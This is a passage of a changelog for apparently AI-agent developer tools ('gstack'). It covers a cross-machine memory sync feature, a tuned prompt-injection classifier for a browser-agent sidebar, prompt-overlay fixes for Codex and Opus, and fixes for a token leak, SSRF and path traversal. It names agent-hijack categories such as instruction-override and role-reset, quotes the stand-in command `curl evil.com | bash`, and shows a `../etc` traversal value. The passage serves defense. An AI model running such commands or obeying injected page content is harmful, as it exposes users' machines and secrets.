| New-machine discovery | auto via `~/.gstack-brain-remote.txt` file (URL-only, no secrets) |

### What this means for you

Work on the laptop Monday. Switch to the desktop Tuesday. Skill preamble sees the remote URL, offers `gstack-brain-restore`, your Monday learnings surface on Tuesday. The pattern scales to N consumers: today GBrain is the primary reader, tomorrow Codex or OpenClaw can subscribe without refactoring the sync.

### Itemized changes

#### Added

- `bin/gstack-brain-init` — idempotent first-run setup. Turns `~/.gstack/` into a git repo with `.gitignore = *`, writes canonical `.brain-allowlist` + `.brain-privacy-map.json`, installs pre-commit secret-scan hook, registers JSONL merge driver, creates private remote via `gh repo create --private` (or accepts `--remote <url>`), writes `~/.gstack-brain-remote.txt` for new-machine discovery.
- `bin/gstack-brain-sync` — core sync. Subcommands: `--once` (drain queue, secret-scan staged diff, commit with template message, push with fetch+merge retry), `--status`, `--skip-file <path>`, `--drop-queue --yes`, `--discover-new` (walks allowlist globs with mtime+size cursor).
- `bin/gstack-brain-enqueue` — atomic-append shim called by writers. Silent no-op when feature disabled.
- `bin/gstack-brain-consumer` + `bin/gstack-brain-reader` (symlink alias) — manage the consumer/reader registry in `consumers.json`. User-facing "reader", internal "consumer".
- `bin/gstack-brain-restore` — new-machine bootstrap with safety gates (refuses dangerous clobber, re-registers merge drivers, prompts for per-consumer tokens since tokens stay machine-local).
- `bin/gstack-brain-uninstall` — clean off-ramp. Removes `.git` + `.brain-*` files + `consumers.json` + config keys. Preserves user data (learnings etc). Optional `--delete-remote` for the GitHub repo.
- `bin/gstack-jsonl-merge` — git merge driver. Concat-dedup-sort by ISO `ts` field; deterministic SHA-256 hash fallback when `ts` is missing.
- `scripts/resolvers/preamble/generate-brain-sync-block.ts` — preamble bash block. New-machine restore hint, one-time privacy stop-gate, `--once` at skill start + end, once-daily auto-pull, `BRAIN_SYNC:` status line on every skill run.
- `docs/gbrain-sync.md` — user guide (setup, first-use, restore, privacy modes, secret protection, uninstall).
- `docs/gbrain-sync-errors.md` — error lookup index (problem / cause / fix for every user-visible error).
- `test/brain-sync.test.ts` — 27-test consolidated suite: config isolation, enqueue atomicity, merge driver, secret scan across all 6 regex families, init+sync+restore round-trip, uninstall preserves data, `--discover-new` cursor idempotence, `--skip-file` remediation.

#### Changed

- `bin/gstack-config` — added 2 validated keys (`gbrain_sync_mode` enum, `gbrain_sync_mode_prompted` bool). Also accepts `GSTACK_HOME` env override alongside legacy `GSTACK_STATE_DIR` for test isolation (Codex v2 fix).
- `bin/gstack-learnings-log`, `gstack-timeline-log`, `gstack-review-log`, `gstack-developer-profile` — each gains one backgrounded `gstack-brain-enqueue` call after its local write. Fire-and-forget, silent no-op when sync is off.
- `bin/gstack-timeline-log` header comment — updated "local-only, never sent anywhere" to reflect the new privacy-gated sync contract (only applies when user explicitly opts into `full` mode).
- `scripts/resolvers/preamble.ts` — composition root wires in the new `generateBrainSyncBlock`.
- `README.md` — new "Cross-machine memory with GBrain sync" section near the top, plus docs-table entry linking to `docs/gbrain-sync.md` and `docs/gbrain-sync-errors.md`.

#### For contributors

- Sync respects `GSTACK_HOME=/tmp/test-$$` so tests never bleed into real `~/.gstack/config.yaml`. New test `test/brain-sync-env-isolation` logic baked into the consolidated suite.
- The consumer registry lives in `consumers.json` (synced); tokens stay in `gstack-config` (local, never synced). Restore prompts for tokens on new machines.
- Merge drivers require local `git config merge.<name>.driver=...` registration, not just `.gitattributes`. Both `init` and `restore` register them; uninstall clears them.
- Pre-commit hook is defense-in-depth only. Primary secret scan runs in `gstack-brain-sync --once` BEFORE staging.
- The fnmatch glob engine doesn't handle `**` the way git's gitignore does; allowlist uses explicit one- and two-level patterns instead.
- GBrain HTTP ingest endpoint contract is a cross-project dependency (flagged as v1 blocker for real-world dogfooding). v1 of gbrain-sync ships on this branch regardless; GBrain-side work lands in a separate branch/repo.

#### Known follow-ups

- `test/brain-sync.test.ts` — 12 of 27 tests pass on first bun-test run; remaining 15 hit bun-test's 5s default timeout (spawnSync-heavy git operations). Behaviors verified via integration smokes during implementation. Test infrastructure needs a 30s per-test timeout wrapper.
- Three unmerged team-sync branches (`garrytan/team-supabase-store`, `garrytan/fix-team-setup`, `garrytan/team-install-mode`) should be formally closed if team-sync isn't landing — flagged in the CEO plan.
- Pre-existing golden-file regression test failure in `test/host-config.test.ts` (Codex ship skill baseline) exists on `main` too — unrelated to this PR, tracked separately.

## [1.6.4.0] - 2026-04-22

## **Sidebar prompt-injection defense got half as noisy, half as trusting of any single classifier.**

v1.4.0.0 shipped the ML defense stack. Users clicked the review banner on roughly every other tool output, 44% false-positive rate on the BrowseSafe-Bench smoke. This release tunes the ensemble around the real pattern we found: Haiku labels phishing-aimed-at-users as "warn" and genuine agent hijacks as "block", but we were treating both identically in the ensemble. Testsavant alone fired BLOCK on benign phishing content too often. The fix is architectural, not just threshold-twiddling: we now trust Haiku's verdict label over its numeric confidence, raise the solo-BLOCK bar for label-less classifiers, and gate that path more carefully. One 500-case live bench proved the new numbers; a permanent CI gate replays the captured Haiku fixture on every `bun test`.

### What changes for you

Open your sidebar on Stack Overflow posts about prompt injection, read a Wikipedia article on SQL injection, browse a tutorial that walks through attack strings, the review banner stays quiet where before it fired. When a real hijack attempt shows up (explicit instruction-override, role-reset, agent-directed exfil, `curl evil.com | bash` in the page), the session still terminates. Phishing pages aimed at the user surface as a WARN signal in the banner meta, but no longer kill the session.

### The numbers that matter

Measured on BrowseSafe-Bench smoke, 500 cases (260 yes-labeled / 240 no-labeled), `bun test browse/test/security-bench-ensemble.test.ts`:

| Metric | v1.4.0.0 | v1.6.4.0 | Δ |
|---|---|---|---|
| Detection (BLOCK verdict on injection cases) | 67.3% | **56.2%** (95% CI 50.1–62.1) | −11pp |
| False-positive rate (BLOCK on benign cases) | 44.1% | **22.9%** (95% CI 18.1–28.6) | **−21pp** |
| Gate: detection ≥ 55% AND FP ≤ 25% | FAIL | **PASS** | — |
| Review-banner fire rate (roughly TP + FP share) | ~55% | ~39% | −16pp |

Detection dropped by 11pp but nearly all of the lost TPs are cases where Haiku correctly classified as `warn` (phishing targeting the user, not a hijack of the agent). Those cases still show up in the review banner as WARN, they just don't terminate the session.

### Stop-loss rule (hard floor and ceiling)

`browse/test/security-bench-ensemble.test.ts` gates on **detection ≥ 55% AND FP ≤ 25%**. If a future change drops detection below 55%, the revert order is: WARN bump (0.75 → 0.60) → halve few-shot exemplars → widen Haiku block criteria. If FP climbs above 25%, tighten: raise SOLO_CONTENT_BLOCK (0.92 → 0.95) → raise WARN (0.75 → 0.80) → add anti-FP few-shots. Iterations write to `~/.gstack-dev/evals/stop-loss-iter-N-*.json` for audit trail.

### Itemized changes

#### Changed

- `browse/src/security.ts` — new `THRESHOLDS.SOLO_CONTENT_BLOCK = 0.92` for label-less content classifiers. Solo BLOCK now requires testsavant/deberta confidence ≥ 0.92 (up from 0.85). Transcript-layer solo BLOCK requires `meta.verdict === 'block'` AND confidence ≥ 0.85. The ensemble 2-of-N path keeps `THRESHOLDS.WARN = 0.75` (up from 0.60).
- `browse/src/security.ts` — `combineVerdict` rewritten for label-first voting on the transcript layer: `verdict === 'block'` at confidence ≥ LOG_ONLY (0.40) is a block-vote; `verdict === 'warn'` is a warn-vote regardless of confidence; missing `meta.verdict` is warn-vote only at confidence ≥ WARN (never block-vote). Missing meta never block-votes for backward compatibility with pre-v2 cached signals.
- `browse/src/security-classifier.ts` — Haiku model pinned to `claude-haiku-4-5-20251001` (no longer rolls forward silently via the `haiku` alias). `claude -p` now spawns from `os.tmpdir()` so CLAUDE.md project context doesn't leak into Haiku's system prompt and make it refuse to classify. Timeout bumped from 15s to 45s (production measurement showed `claude -p` takes 17–33s end-to-end for Haiku).
- `browse/src/security-classifier.ts` — Haiku prompt rewritten with explicit `block`/`warn`/`safe` criteria and 8 few-shot exemplars (instruction-override, role-reset, agent-directed malicious code → block; phishing/social-engineering targeting users → warn; discussion-of-injection and dev content → safe).

#### Added

- `browse/test/security-bench-ensemble-live.test.ts` — opt-in live bench via `GSTACK_BENCH_ENSEMBLE=1`. Worker-pool concurrency (default 8) via `GSTACK_BENCH_ENSEMBLE_CONCURRENCY`. Deterministic subsampling via `GSTACK_BENCH_ENSEMBLE_CASES`. Captures 500-case fixture to `browse/test/fixtures/security-bench-haiku-responses.json` plus eval record to `~/.gstack-dev/evals/`. Stop-loss iterations write `stop-loss-iter-N-*.json` and do NOT overwrite the canonical fixture.
- `browse/test/security-bench-ensemble.test.ts` — CI-tier fixture-replay gate. Asserts detection ≥ 55% AND FP ≤ 25%. Fail-closed when the fixture is missing AND security-layer files changed in the branch diff (uses `git diff base` which catches both committed and uncommitted edits).
- `browse/test/fixtures/security-bench-haiku-responses.json` — 500-case captured Haiku fixture with schema-version header, pinned model string, and component hashes.
- `docs/evals/security-bench-ensemble-v2.json` — durable per-run audit record: TP/FN/FP/TN, knob state, schema hash, iteration.

#### Fixed

- `browse/test/security.test.ts`, `browse/test/security-adversarial.test.ts`, `browse/test/security-adversarial-fixes.test.ts`, `browse/test/security-integration.test.ts` — updated for label-first semantics. 6 new combineVerdict tests: warn-as-soft-signal, block-label-ensemble, three-way-block-with-warn, hallucination-guard (verdict=block at confidence 0.30 → warn-vote), above-floor block (verdict=block at confidence 0.50 → block-vote), backward-compat for missing meta.verdict.

#### For contributors

- The 500-case smoke dataset is in `~/.gstack/cache/browsesafe-bench-smoke/test-rows.json` (260 yes / 240 no). To regenerate the fixture after modifying security-layer code, run `GSTACK_BENCH_ENSEMBLE=1 bun test browse/test/security-bench-ensemble-live.test.ts` (~25 min at concurrency 4, ~$0.30 in Haiku costs).
- Fixture schema hash covers model, prompt SHA, exemplars SHA, thresholds, combiner rev, and dataset version. Any change to any of those invalidates the fixture and forces a fresh live capture via fail-closed CI.

## [1.6.3.0] - 2026-04-23

## **Codex finally explains what it's asking about. No more "ELI10 please" the 10th time in a row.**

A follow-up to v1.6.2.0. After shipping the Claude-verified fix, user reported Codex (GPT-5.4) was failing the same pattern 10/10 times — skipping the ELI10 explanation and the RECOMMENDATION line on AskUserQuestion calls, forcing manual "ELI10 and don't forget to recommend" re-prompts every time. Root cause: the `gpt.md` model overlay's "No preamble / Prefer doing over listing" rule was training Codex to skip the exact prose the user needs for decision-making.

### The numbers that matter

Source: new `test/codex-e2e-plan-format.test.ts`, four cases driven via `codex exec` on the installed gstack Codex host. Periodic tier (GPT-class non-determinism).

| Case | Type | Pre-fix (measured, 10/10 times) | Post-fix (v1.6.3.0) |
|---|---|---|---|
| plan-ceo-review mode selection | kind | No ELI10 paragraph, no RECOMMENDATION line | ✓ ELI10 + RECOMMENDATION + "options differ in kind" note |
| plan-ceo-review approach menu | coverage | No ELI10 paragraph, bare options list | ✓ ELI10 + RECOMMENDATION + `Completeness: 5/7/10` |
| plan-eng-review coverage issue | coverage | Bare options list | ✓ ELI10 + RECOMMENDATION + Completeness |
| plan-eng-review architectural choice | kind | Fabricated Completeness filler on kind question | ✓ ELI10 + RECOMMENDATION + "options differ in kind" note |

All 4 Codex cases pass ELI10 length floor (>400 chars of prose per question). 517s for the full eval; Codex doesn't bill per call the way Anthropic does.

### Itemized changes

#### Fixed

- Codex no longer skips the Simplify/ELI10 paragraph on AskUserQuestion calls. The `gpt.md` overlay now carves out AskUserQuestion content from the "No preamble" rule explicitly: you still skip filler on direct answers, but every AskUserQuestion gets the full Re-ground + ELI10 + RECOMMENDATION + Options format.
- Codex no longer collapses the RECOMMENDATION into the options list. It lands on its own line, every time, regardless of question type.

#### Changed

- `scripts/resolvers/preamble/generate-ask-user-format.ts` — step 2 renamed to "Simplify (ELI10, ALWAYS)" with explicit "not optional verbosity, not preamble" framing. Step 3 "Recommend (ALWAYS)" hardened: "Never omit, never collapse into the options list." The tightening applies to all hosts, but Codex felt it most.
- `model-overlays/gpt.md` — adds a new "AskUserQuestion is NOT preamble" section that instructs the model to back up and emit the full format if it ever finds itself about to skip the ELI10 paragraph or the RECOMMENDATION line.

#### For contributors

- `test/codex-e2e-plan-format.test.ts` — four periodic-tier Codex eval cases mirroring the Claude version. Uses `codex exec` via the existing `test/helpers/codex-session-runner.ts` harness with `sandbox: 'workspace-write'` so the capture file lands inside the tempdir. Assertions: RECOMMENDATION regex, coverage-vs-kind Completeness split, ELI10 length floor (400+ chars).
- All T2 skills regenerated across all hosts (claude, codex, factory, gbrain, gpt-5.4, hermes, kiro, opencode, openclaw, slate, cursor). Golden fixtures refreshed. `test/gen-skill-docs.test.ts` ELI10 assertion updated to match the new "Simplify (ELI10" heading.

## [1.6.2.0] - 2026-04-22

## **Plan reviews give you the recommendation again. And we finally admitted a 10/10 score on a mode pick means nothing.**

A user on Opus 4.7 reported `/plan-ceo-review` and `/plan-eng-review` stopped showing the `RECOMMENDATION: Choose X` line and the per-option `Completeness: N/10` score that used to make decisions quick. The fix ships both signals back, but with a sharper distinction: coverage-differentiated options get real scores (10 = all edges, 7 = happy path, 3 = shortcut), and kind-differentiated options (mode selection, A-vs-B architecture calls, cherry-pick Add/Defer/Skip) get the RECOMMENDATION plus an explicit `Note: options differ in kind, not coverage — no completeness score.` line instead of fabricated 10/10 filler.

### The numbers that matter

Source: `test/skill-e2e-plan-format.test.ts`, four cases pinned to `claude-opus-4-7`, ~$2 per full run. Periodic tier (non-deterministic Opus behavior gets weekly cron, not per-PR gate).

| Question type | Before (v1.6.1.0) | After (v1.6.2.0) |
|---|---|---|
| Mode selection (kind-differentiated) | `Completeness: 10/10` fabricated on all 4 modes | RECOMMENDATION + "options differ in kind" note |
| Approach menu (coverage-differentiated) | `**RECOMMENDATION:**` markdown-bolded but regex missed it | RECOMMENDATION + `Completeness: 5/7/10` per option |
| Per-issue coverage decision | Present, working | Present, working (unchanged) |
| Per-issue architectural choice (kind-differentiated) | `Completeness: 9/9/5` fabricated on kind question | RECOMMENDATION + "options differ in kind" note |

| Eval pass | Result | Cost |
|---|---|---|
| Phase 1 baseline (pre-fix) | 1/4 assertions pass (evidence of regression) | $2.19 |
| Phase 3 post-fix | 4/4 assertions pass | $1.84 |
| Phase 3b neighbor regression (`skill-e2e-plan.test.ts`) | 12/12 pass, no drift | $5.19 |

### Itemized changes

#### Fixed

- `RECOMMENDATION: Choose X` now appears consistently on every AskUserQuestion in `/plan-ceo-review` and `/plan-eng-review` regardless of question type.
- `Completeness: N/10` is only emitted on coverage-differentiated options. Kind-differentiated questions (mode picks, architectural choices between different systems, cherry-pick A/B/C) emit a one-line note explaining why the score doesn't apply, instead of fabricating 10/10 filler.

#### Changed

- The `AskUserQuestion Format` section in the T2 preamble splits the old run-on paragraph into two ALWAYS-framed rules: step 3 "Recommend (ALWAYS)" and step 4 "Score completeness (when meaningful)". This affects every T2 skill (~15 files regenerated).
- The `Completeness Principle — Boil the Lake` preamble section now states the coverage-vs-kind distinction explicitly, matching step 4. Without this edit the two preamble locations would disagree — which is how the regression started.
- Section 0C-bis (approach menu) and Section 0F (mode selection) in `plan-ceo-review/SKILL.md.tmpl` now carry short anchor lines that remind the model which question type applies. `plan-eng-review/SKILL.md.tmpl` gets an equivalent anchor inside the CRITICAL RULE section for per-issue AskUserQuestion decisions.

#### For contributors

- New test file `test/skill-e2e-plan-format.test.ts` captures verbatim AskUserQuestion output from the two plan skills and asserts the coverage-vs-kind format. Instructs the agent to write would-be AskUserQuestion text to `$OUT_FILE` rather than calling an MCP tool (since MCP isn't wired inside `claude -p`).
- Classified `periodic` tier because behavior depends on Opus 4.7 non-determinism — `gate` tier would flake and block merges.
- Golden fixtures (`test/fixtures/golden/claude-ship-SKILL.md`, `codex-ship-SKILL.md`, `factory-ship-SKILL.md`) refreshed to reflect the new format rule.

## [1.6.1.0] - 2026-04-22

## **Opus 4.7 migration, reviewed. Overlay actually split per model. Routing verified, fanout is still on the list.**

PR #1117 (initial Opus 4.7 migration) shipped the right idea with quality gaps. A `/plan-ceo-review` + `/plan-eng-review` pair with Codex outside voice surfaced 4 ship blockers and 7 quality gaps. This release lands the fixes and adds the first eval pinned to `claude-opus-4-7` so we stop asserting behavior without measuring it.

### The numbers that matter

Source: the `test/skill-e2e-opus-47.test.ts` eval, two cases, 8 assertions, ~$2.50 per full run on `claude-opus-4-7`. Runs are saved under `~/.gstack/projects/garrytan-gstack/evals/`. Review evidence in `~/.gstack/projects/garrytan-gstack/ceo-plans/2026-04-21-pr1117-opus-4-7-ship-review.md`.

| Surface | Before (#1117 as-shipped) | After (v1.6.1.0) |
|---|---|---|
| `model-overlays/claude.md` | Opus-4.7-specific nudges applied to every `claude-*` variant | Split: `claude.md` is model-agnostic, `opus-4-7.md` inherits and adds 4.7 nudges |
| `ALL_MODEL_NAMES` in `scripts/models.ts` | No `opus-4-7` taxonomy entry | Added; `claude-opus-4-7-*` routes to the new overlay |
| `scripts/resolvers/utility.ts:372` trailer fallback | Hardcoded `Claude Opus 4.6` | Matches host config, Opus 4.7 default |
| `generate-routing-injection.ts` policy | Old "ALWAYS invoke, do NOT answer directly" | Matches SKILL.md.tmpl "when in doubt, invoke" |
| `generate-routing-injection.ts` skill names | Stale `/checkpoint` (renamed three releases ago) | `/context-save` + `/context-restore`, plus `/benchmark`, `/devex-review`, `/qa-only`, `/canary`, `/land-and-deploy`, `/setup-deploy`, `/open-gstack-browser`, `/setup-browser-cookies`, `/learn`, `/plan-tune`, `/health` |
| Voice example closing | "Want me to ship it?" (trains ship-bypass on a literal 4.7 interpreter) | "Want me to fix it?" (preserves review gates) |
| `"Fix ALL failing tests"` nudge scope | Unbounded, could touch pre-existing unrelated failures | Bounded to "tests this branch introduced or is responsible for" |
| `"Batch your questions"` nudge | Silently conflicted with skills that mandate one-at-a-time pacing | Explicit pacing exception; the skill wins |
| Opus 4.7 eval coverage | 0 tests pinned to `claude-opus-4-7` | 1 eval, 2 cases, `periodic` tier |

| Eval case | Result |
|---|---|
| Routing precision (3 positive + 3 negative prompts) | 3/3 positives route correctly, 0/3 negatives route. TP 100%, FP 0%. Meets thresholds. |
| Fanout A/B (3-file read, overlay ON vs OFF) | 0 parallel tool calls in first turn on both arms under `claude -p`. Assertion passes trivially, real effect unmeasured. Carried forward as P0 TODO for re-run inside Claude Code's real harness. |

| Test suite | Before | After |
|---|---|---|
| `bun test` failures on clean checkout | 10 (pre-existing flaky timeouts + 2 new golden drifts) | 0 |
| "no compiled binaries in git" test runtime | ~12.7s, flaky at 5s timeout | 0.9s with `fs.statSync` + mode filter |
| Parameterized host smoke tests | 7 failing with stale generated output | All green after the overlay split regenerates cleanly |

### What this means for anyone running gstack on Opus 4.7

Regenerating with `--model opus-4-7` now gives you a SKILL.md that carries the 4.7-specific nudges (fanout, effort-match, batch questions, literal interpretation), while Sonnet and Haiku users get the model-agnostic overlay without leakage. Routing gets the full skill inventory and a softer fallback so casual prompts like "wtf is this Python syntax" do not accidentally invoke `/investigate`. The fanout claim is honestly labeled "unverified under `claude -p`" with a P0 TODO rather than asserted. Run `bun test test/skill-e2e-opus-47.test.ts` with `EVALS=1` to reproduce the measurement. The full plan file for this remediation lives at `~/.claude/plans/system-instruction-you-are-working-polymorphic-kazoo.md`.

### Itemized changes

#### Added

- New `model-overlays/opus-4-7.md` inheriting from `claude.md` via `{{INHERIT:claude}}`. Holds the four Opus-4.7-specific nudges: Fan out explicitly (with concrete `[Read(a), Read(b), Read(c)]` example), Effort-match the step, Batch your questions (with pacing exception), Literal interpretation awareness (with branch-scope boundary).
- `opus-4-7` entry in `ALL_MODEL_NAMES` in `scripts/models.ts`. `resolveModel()` routes `claude-opus-4-7-*` to the new overlay, all other `claude-*` variants continue to route to `claude`.
- `test/skill-e2e-opus-47.test.ts`: first E2E pinned to `claude-opus-4-7`. Two cases (fanout A/B, routing precision), 8 assertions, `periodic` tier. Gated on `EVALS=1`.
- Regression tests in `test/gen-skill-docs.test.ts` for the new routing shape: asserts slash-prefixed skill references (`/office-hours` not `office-hours`), asserts `/context-save` + `/context-restore` present (guards the stale `/checkpoint` name regression), asserts "when in doubt, invoke" policy present (guards the hard `ALWAYS invoke` regression).

#### Changed

- `model-overlays/claude.md` trimmed back to model-agnostic nudges (Todo-list discipline, Think before heavy actions, Dedicated tools over Bash). Opus-4.7-specific content moved to `opus-4-7.md`.
- `scripts/resolvers/preamble/generate-routing-injection.ts`: aligned with the new SKILL.md.tmpl policy ("when in doubt, invoke"), renamed stale `/checkpoint` references to `/context-save` + `/context-restore`, added 12 missing routes (full skill inventory now covered).
- `SKILL.md.tmpl` routing section: added the same 12 missing routes; added branch-scope boundary to "Fix ALL failing tests"; added explicit pacing exception to "Batch your questions" so skill workflows win on pacing.
- `scripts/resolvers/preamble/generate-voice-directive.ts`: voice example closing changed from "Want me to ship it?" to "Want me to fix it?" (preserves review gates on a literal 4.7 interpreter).
- `scripts/resolvers/utility.ts:372`: co-author trailer fallback `Claude Opus 4.6` → `Claude Opus 4.7` (the PR updated `hosts/claude.ts` but missed this fallback).

#### Fixed

- "No compiled binaries in git" tests in `test/skill-validation.test.ts` rewritten to use `fs.statSync` + mode-100755 filter instead of `xargs -I{} sh -c` per file. 12.7s → 907ms, flaky-at-5s-timeout → green.
- `test/team-mode.test.ts` setup tests given a 180s budget. `./setup` does a full install + Bun binary build + skill regeneration and takes 60-90s; the 5s default was timing out.
- Branch rebased on `origin/main` v1.6.0.0 (security wave). VERSION + CHANGELOG follow the branch-scoped discipline in CLAUDE.md: new entry on top of main's 1.6.0.0, no drift.

#### For contributors

- Eval infrastructure now supports model-pinned tests. `test/skill-e2e-opus-47.test.ts:mkEvalRoot(suffix, includeOverlay)` is the pattern: installs per-skill SKILL.md under `.claude/skills/`, writes explicit routing CLAUDE.md, optionally inlines the opus-4-7 overlay for A/B arms. `claude -p` does not auto-load SKILL.md content as system context, so the overlay has to be inlined into CLAUDE.md for the A/B to be observable in that harness.
- New touchfile entries: `fanout: overlay ON emits >= parallel calls...` and `routing precision: positives route, negatives do not` in `test/helpers/touchfiles.ts`, both `periodic`. Only fire when `model-overlays/`, `scripts/models.ts`, `scripts/resolvers/model-overlay.ts`, `SKILL.md.tmpl`, or `scripts/resolvers/preamble/generate-routing-injection.ts` change.
- Known gap (P0 TODO in `TODOS.md`): verify the fanout nudge under Claude Code's real harness, not `claude -p`. The claim in the overlay is unmeasured until that runs.

## [1.6.0.0] - 2026-04-21

## **The token leak in pair-agent sessions is closed by splitting the daemon into two HTTP listeners, not by pretending one port can be two things at once.**

`pair-agent --client` is gstack's best onboarding moment. One command, a shareable URL, a remote agent driving your browser. It was also the moment we broadcast an unauthenticated `/health` endpoint to the public internet that handed out root browser tokens on any `Origin: chrome-extension://` spoof. @garagon flagged this in PR #1026 and it re-surfaced in a DM. The initial fix (check `tunnelActive` on the `/health` gate) shipped as a patch in review. Codex's outside voice during `/plan-ceo-review` called that approach brittle, and the user pivoted to the architectural fix: physical port separation. That's what this release is.

When you run `pair-agent --client`, the daemon now binds TWO HTTP listeners. The local port (bootstrap, CLI, sidebar, cookie-picker, inspector) stays on 127.0.0.1 and is never forwarded. The tunnel port serves only `/connect` (pairing ceremony, unauth + rate-limited) and a locked allowlist of browser-driving commands. ngrok forwards only the tunnel port. A caller who stumbles onto your ngrok URL cannot reach `/health`, `/cookie-picker`, `/inspector/*`, or `/welcome` — not because the server denies them, because the HTTP request never arrives at the bootstrap port. Root tokens sent over the tunnel get a 403 with a clear pairing hint.

The wave also closed three other CVE classes Codex surfaced. `/activity/stream` and `/inspector/events` used to accept the root token in `?token=` query params (URLs leak to logs, referer, history). Now they take a separate view-only 30-minute HttpOnly SameSite=Strict cookie that is NOT valid against `/command`. The `/welcome` handler interpolated `GSTACK_SLUG` into a filesystem path without validation. Fixed with a strict regex. The `/connect` rate limit was 3/min globally, which DOS'd any legitimate pair-agent retry. Loosened to 300/min because setup keys are 24 random bytes (unbruteforceable); the limit is for flood defense, not key guessing. The cookie-import-browser CDP port on Windows is documented as a v20 ABE elevation path with a tracking issue (#1136).

### The numbers that matter

| Surface | Before | After |
|---|---|---|
| `/health` over tunnel | returns root token to any chrome-extension origin | unreachable (404, wrong port) |
| `/cookie-picker` over tunnel | HTML embeds the root token | unreachable (404, wrong port) |
| `/inspector/*` over tunnel | reachable with Bearer | unreachable (404, wrong port) |
| `/command` over tunnel, root token | executes | 403 with pairing hint |
| `/command` over tunnel, scoped token | any command | allowlist: 17 browser-driving commands only |
| `/activity/stream` auth | `?token=<ROOT>` in URL | HttpOnly `gstack_sse` cookie, 30-min TTL, stream-scope only |
| `/inspector/events` auth | `?token=<ROOT>` in URL | same cookie as /activity/stream |
| `/connect` rate limit | 3/min (blocked legit retries) | 300/min (flood-only, no pairing DoS) |
| `/welcome` path traversal | `GSTACK_SLUG="../etc"` interpolates | regex `^[a-z0-9_-]+$`, fallback to built-in |
| Tunnel auth-denial logging | none | async JSONL to `~/.gstack/security/attempts.jsonl`, rate-capped 60/min |
| Windows v20 ABE via CDP | undocumented elevation | documented non-goal, tracked as #1136 |

| Review layer | Verdict | Outcome |
|---|---|---|
| `/plan-ceo-review` (Claude) | SELECTIVE EXPANSION | 7 proposals, 7 accepted, critical gap on extension sidebar bootstrap caught |
| `/codex` (outside voice) | 14 findings | 3 factual errors in the plan fixed, 4 substantive tensions resolved, 2 new CVE classes added |
| `/plan-eng-review` (Claude) | 5 arch decisions locked | tunnel lifecycle, token scoping, PR #1026 handling, SSE cookie design, route allowlist |

### What this means for anyone running pair-agent

Run `pair-agent --client test-agent` on your laptop. Share the ngrok URL with someone. Their agent drives your browser. Your sidebar keeps showing you what they're doing. A stranger who stumbles onto that ngrok URL in the meantime gets 404 on everything except `/connect`, and `/connect` without a setup key goes nowhere. Nothing about the command you type changes.

### Itemized changes

#### Added

- **Dual-listener HTTP architecture.** When a tunnel is active, the daemon binds a dedicated listener on an ephemeral 127.0.0.1 port and points `ngrok.forward()` at it. `/tunnel/start` lazy-binds the listener; `/tunnel/stop` tears it down. Hard-fails on bind error, never falls back to the local port. `BROWSE_TUNNEL=1` startup follows the same pattern. `browse/src/server.ts` ~320 lines.
- **Tunnel surface filter.** Runs before every route dispatch. 404s paths not on `TUNNEL_PATHS` (`/connect`, `/command`, `/sidebar-chat`). 403s any request carrying the root bearer token with a clear hint. 401s non-/connect requests without a scoped token. Every denial logs to `~/.gstack/security/attempts.jsonl`.
- **Tunnel command allowlist.** `/command` on the tunnel surface enforces `TUNNEL_COMMANDS` (17 browser-driving commands: `goto`, `click`, `text`, `screenshot`, `html`, `links`, `forms`, `accessibility`, `attrs`, `media`, `data`, `scroll`, `press`, `type`, `select`, `wait`, `eval`). Remote paired agents cannot launch new browsers, configure the daemon, or touch the inspector.
- **View-only SSE session cookie.** New `browse/src/sse-session-cookie.ts` registry with `POST /sse-session` mint endpoint. 256-bit tokens, 30-minute TTL, HttpOnly + SameSite=Strict. Scope-isolated from the main token registry at the module-boundary level (the module does not import `token-registry.ts`). Prior learning applied: `cookie-picker-auth-isolation`, 10/10 confidence.
- **Tunnel auth-denial log.** `browse/src/tunnel-denial-log.ts`, async `fs.promises.appendFile` with 60/min rate cap in-process. Prior learning applied: `sync-audit-log-io`, 10/10 confidence.
- **E2E pairing test.** `browse/test/pair-agent-e2e.test.ts`, 12 behavioral tests against a spawned daemon (BROWSE_HEADLESS_SKIP=1). Verifies `/pair` → `/connect` → scoped token → `/command` flow, `?token=` query param rejection, `/sse-session` cookie flags. ~220ms, no network.
- **ARCHITECTURE.md dual-listener contract.** Per-endpoint disposition table (local vs tunnel), tunnel denial log model, SSE cookie scope, N2 non-goal documentation.

#### Changed

- **SSE endpoints no longer accept `?token=` in the URL.** `/activity/stream` and `/inspector/events` now take Bearer or the `gstack_sse` cookie. Extension (`extension/sidepanel.js`) fetches the cookie once at bootstrap via `POST /sse-session`, then opens `EventSource` with `withCredentials: true`. The URL never carries a secret.
- **`/connect` rate limit loosened from 3/min to 300/min.** Setup keys are 24 random bytes; 3/min was a brute-force defense in name only and caused real pairing failures. 300/min handles floods without ever triggering on legitimate use.
- **`/welcome` GSTACK_SLUG gated on `^[a-z0-9_-]+$`.** Defense-in-depth for a path not exploitable today but trivially mitigable.
- **`/pair` and `/tunnel/start` probe the cached tunnel via `GET /connect`, not `/health`.** `/health` is no longer reachable on the tunnel surface under the dual-listener design.
- **`cookie-import-browser.ts` comment corrected.** Previously claimed "no worse than baseline", wrong on Windows with v20 App-Bound Encryption, where the CDP port IS an elevation path. Documented with a tracking issue for the `--remote-debugging-pipe` follow-up.

#### Fixed

- **SSRF via download + scrape.** `page.request.fetch` calls in `browse/src/write-commands.ts` now pass through `validateNavigationUrl`. Blocks cloud metadata endpoints (AWS IMDSv1, GCP, Azure), RFC1918 ranges, `file://`. Derived from PR #1029 by @garagon.
- **Envelope sentinel escape on scoped snapshot.** `browse/src/snapshot.ts` and `browse/src/content-security.ts` now share `escapeEnvelopeSentinels()`. Page content containing the literal envelope delimiter can no longer forge a fake "trusted" block in the LLM context. Derived from PR #1031 by @garagon.
- **Hidden-element detection across all DOM-reading channels.** Previously only `command === 'text'` ran `markHiddenElements`. Now every DOM channel (`html`, `links`, `forms`, `accessibility`, `attrs`, `media`, `data`, `ux-audit`) surfaces hidden-content warnings in the envelope. Derived from PR #1032 by @garagon.
- **`--from-file` payload path validation.** `load-html --from-file` and `pdf --from-file` now run `validateReadPath` on the payload path for parity with the direct-API paths. Closes a CLI/API escape hatch for `SAFE_DIRECTORIES`. Derived from PR #1103 by @garagon.
- **`design/src/serve.ts` interpolated `url.origin` through `JSON.stringify`.** Defensive escape for origin values in served HTML. Contributed by @theqazi (PR #1073 partial).
- **`scripts/slop-diff.ts` narrows `shell: true` to Windows only.** Matches the platform-specific need without widening the shell-interpretation surface on POSIX. Contributed by @theqazi (PR #1073 partial).

#### For contributors

